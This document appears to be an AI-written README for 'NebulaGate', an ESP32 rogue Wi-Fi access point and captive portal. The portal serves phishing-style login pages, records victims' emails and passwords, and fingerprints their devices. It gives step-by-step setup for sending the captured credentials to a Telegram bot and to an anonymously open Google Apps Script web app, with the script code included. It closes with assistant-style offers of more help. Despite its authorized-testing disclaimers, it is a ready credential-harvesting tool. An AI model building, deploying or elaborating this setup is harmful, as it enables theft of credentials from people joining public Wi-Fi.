🌌 NebulaGate v1.0

Nebula Gateway — A lightweight captive-portal & monitoring framework for authorized security testing

> ⚠️ Important: This project is for education and authorized penetration testing only. Do not use it against networks or devices you do not own or have explicit permission to test.




---

🚀 What changed from J.A.R.V.I.S

Project name changed from J.A.R.V.I.S → NebulaGate (matching the futuristic, stealthy captive-portal vibe).

README updated to make Telegram & Google Sheets integrations optional, and to describe how to obtain Chat IDs and set up sheets/webhooks.

Clear guidance added about the Configuration tab (it is still under development/unstable) and the watchdog restarts.



---

🔍 Overview

NebulaGate creates a rogue access point and captive portal intended for red-team training and lab exercises. It simulates a public Wi‑Fi and presents a customizable login page to connected clients — useful for testing user awareness, detection, and logging.

The device runs an admin panel (mobile-friendly) where you can monitor connected devices, view captured credentials (if enabled), and configure optional integrations.


---

🌟 Features (complete list)

Core

Rogue AP with spoofable SSID (e.g. Free_Public_WiFi)

Captive portal that redirects HTTP traffic to a phishing-style login page

Serve customizable HTML templates (supports Instagram-style or simple forms)

Local logging of captured fields (email/password/inputs)

Device fingerprinting (MAC, IP, UA string, connection time)

Uptime & system health indicators

Admin control panel protected by PIN (default: 26062008)


Monitoring & Management

Live logs via WebSocket

Victim/device lists with timestamps

RSSI / signal strength display for clients

Auto-disconnect of idle clients

Manual reset / clear logs


Optional integrations (must be configured in the Admin → Configuration tab)

Telegram bot alerts (Real-time push notifications)

Google Sheets logging (push captured rows into a spreadsheet)

Remote notifications for lockouts / watchdog events



---

⚙️ Configuration (what to add in the Admin → Configuration tab)

In the configuration UI you will find the following editable options. All of them are optional — leave blank or disable features you don't want.

real_ssid — (optional) Your real Wi-Fi SSID (if using AP+STA mode)

real_password — (optional) Password for your real Wi-Fi

enable_telegram — true / false

telegram_bot_token — (optional) 123456:ABC-DEF... (from BotFather)

telegram_chat_id — (optional) Numeric chat id where alerts are sent

enable_sheets — true / false

google_sheet_id — (optional) Google Sheet ID (see steps below)

google_script_url — (optional) URL of a Google Apps Script web app (if using the Apps Script method)

admin_pin — change the default PIN from 26062008


Tip: If the web UI Config tab is unstable, you can also write these values in the device's filesystem (e.g. config.json in SPIFFS/LittleFS) or set them via serial — see the device source for config.json schema.


---

✅ How to get a Telegram Bot Token & Chat ID

1. Create the bot

1. Open Telegram and message @BotFather.


2. Send /newbot and follow the prompts (choose a name and username).


3. BotFather returns a Bot Token (looks like 123456789:AAE...). Copy it.



2. Get your chat ID There are two easy ways:

A — Recommended (quick):

1. Start a chat with your bot (click the bot and send any message to it).


2. Open this URL in your browser (replace <TOKEN>):



https://api.telegram.org/bot<TOKEN>/getUpdates

3. Look for "chat":{"id":123456789,...} in the JSON — that numeric value is your chat_id.



B — Alternative (group chat):

1. Add your bot to a group and send a message.


2. Call getUpdates as above — the response will include the group chat ID (note: group IDs can be negative numbers).



3. Test sending a message In your browser, test the bot posting to the chat:

https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=HelloFromNebulaGate

If you see the message appear, the bot & chat ID are correct.


---

✅ How to log to Google Sheets

There are two common methods: the Easy (Form) method and the Advanced (Apps Script Webhook) method.

Method A — Easy (Google Form → Sheet)

1. Create a new Google Sheet.


2. Tools → Create a form (or visit Google Forms and attach responses to the sheet).


3. Add fields matching the payload you will send (e.g. time, mac, ip, email, password, user_agent).


4. From the Responses tab in Forms, click the 3-dots → Get prefilled link to test. Forms will automatically append rows to your Sheet.


5. In your config, only set google_sheet_id (the long ID in the sheet URL). Use the app code to POST to the form action or format data in the same order as the form.



Pros: Very simple, no OAuth/credentials. Cons: Less flexible; cannot append arbitrarily structured JSON without mapping to form fields.

Method B — Advanced (Google Apps Script Web App) — recommended for custom JSON

1. Create a new Google Sheet and note its ID from the URL: https://docs.google.com/spreadsheets/d/<SHEET_ID>/edit.


2. In the Sheet: Extensions → Apps Script.


3. Replace the default Code.gs with the following snippet (example):



function doPost(e) {
  try {
    var ss = SpreadsheetApp.openById('REPLACE_WITH_SHEET_ID');
    var sheet = ss.getSheetByName('Sheet1');
    var payload = {};
    if (e.postData && e.postData.contents) {
      payload = JSON.parse(e.postData.contents);
    } else if (e.parameter) {
      payload = e.parameter;
    }
    sheet.appendRow([new Date(), payload.mac || '', payload.ip || '', payload.email || '', payload.password || '', payload.ua || '']);
    return ContentService.createTextOutput(JSON.stringify({status: 'ok'})).setMimeType(ContentService.MimeType.JSON);
  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({status: 'error', message: err.message})).setMimeType(ContentService.MimeType.JSON);
  }
}

4. Replace REPLACE_WITH_SHEET_ID with your sheet id (or store it in script properties).


5. Deploy → New deployment → Select Web app:

Execute as: Me

Who has access: Anyone (even anonymous) — or restrict to authorised accounts and use OAuth (more complex)



6. Deploy and copy the Web app URL.


7. In NebulaGate config, set google_script_url to that Web app URL and google_sheet_id if needed.


8. NebulaGate should POST JSON to that URL. Example JSON:



{"mac":"AA:BB:CC:DD:EE:FF","ip":"192.168.4.2","email":"test@example.com","password":"hunter2","ua":"Mozilla/5.0"}

Pros: Full control, structured JSON, append any fields. Cons: You must deploy a web app (but no service account needed if you publish for anonymous posting).


---

⚠️ Important notes about the Configuration tab & stability

The Configuration tab is still under development. Some fields might not save correctly in the current build.

The device may trigger the watchdog timer and restart under heavy load (memory pressure or long-running tasks). Typical symptoms:

Sudden reboot with logs showing watchdog or WDT messages.

Config changes not taking effect until reboot.



Workarounds / mitigation

If the web Config UI fails, edit config.json stored on the device filesystem (SPIFFS/LittleFS) and reboot the device.

Reduce memory usage: disable Google Sheets / Telegram while testing; lower log retention; shorten live WebSocket log buffer.

Increase watchdog timeout (in firmware) if you are comfortable editing code — search for watchdog / esp_task_wdt_init and tweak the timeout value carefully.

Watch the serial console for OOM (out of memory) messages; reduce heavy operations accordingly.



---

🔧 Quick start (flash → run)

1. Flash the NebulaGate firmware to your ESP32 (use PlatformIO or Arduino IDE). Main sketch: NebulaGate.ino.


2. Power on the device. The AP will start as the configured SSID (default: Free_Public_WiFi).


3. Connect a phone or laptop to the AP. The captive portal should redirect automatically; if not, visit http://192.168.4.1.


4. Admin panel: http://192.168.4.1/admin → PIN 26062008 (change this in config!).




---

🔁 Known Issues & Troubleshooting

Watchdog restarts — see mitigation above.

Config tab unstable — use config.json fallback.

Telegram/Sheets not delivering after long idle: re-check tokens/URLs, restart the device, and re-test via the web sendMessage and POST test methods described above.


If you want, I can prepare a small config.json example and an Apps Script file you can copy-paste into your Google Apps Script editor.


---

🧾 Legal Disclaimer

This software is intended only for authorized testing on equipment you own or where you have explicit permission. Unauthorized interception of communications and phishing are illegal.


---

🙏 Credits

Built by Muhammad Javed Hussain (you can edit this if you'd like a different author string) Design inspiration: Orbitron font and sci‑fi UI aesthetics.


---

If you'd like, I can:

provide the config.json example to paste into SPIFFS/LittleFS,

generate a copy‑paste Google Apps Script project ready to deploy,

or rename the project to a different suggested name (e.g., PhantomNet, AuroraGate, OrionPortal).


Tell me which of those you'd like next and I'll create it.

